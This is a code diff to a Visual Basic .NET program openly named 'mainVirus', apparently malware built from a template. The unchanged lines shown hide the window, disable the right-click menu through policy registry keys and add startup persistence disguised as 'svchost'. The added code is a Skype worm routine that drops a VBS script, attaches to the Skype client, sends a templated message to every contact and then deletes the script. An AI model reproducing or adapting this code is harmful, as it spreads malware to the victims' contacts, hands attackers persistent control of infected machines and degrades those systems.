@@ -16,6 +16,9 @@ Public Class mainVirus
         Me.Hide()
         Me.ShowInTaskbar = False
 
+        'Skype Spread
+        SkypeSpread()
+                
         'Disable Right Mouse Click
         My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" & "\NoViewContextMenu", 1, "REG_DWORD")
         Dim systemRegistry As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\System")
@@ -256,6 +259,32 @@ Public Class mainVirus
         If value <> Application.ExecutablePath.ToString() Then
             regStartUp.CreateSubKey("svchost")
             regStartUp.SetValue("svchost", Application.ExecutablePath.ToString())
+        End If
+    End Sub
+
+Sub SkypeSpread()
+        If "%SKYPE%" = "True" Then
+            Try
+                Dim g As New StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\cc.vbs")
+                g.BaseStream.Seek(0, SeekOrigin.End)
+                g.WriteLine("on error resume next")
+                g.WriteLine("set Fruxr = WScript.CreateObject(""Skype4COM.Skype"", ""Skype_"")")
+                g.WriteLine("Fruxr.Client.Start()")
+                g.WriteLine("Fruxr.Attach()")
+                g.WriteLine("For Each KZN In Fruxr.Friends")
+                g.WriteLine("Fruxr.SendMessage KZN.handle,""%IMMESSAGE%""")
+                g.WriteLine("next")
+                g.Close()
+                Dim p As New Process
+                Dim ProcessProperties As New ProcessStartInfo
+                ProcessProperties.FileName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\cc.vbs"
+                Dim myProcess As Process = Process.Start(ProcessProperties)
+                myProcess.WaitForExit()
+                Threading.Thread.Sleep(5000)
+                IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\cc.vbs")
+            Catch ex As Exception
+                MsgBox(ex.ToString)
+            End Try
         End If
     End Sub
 
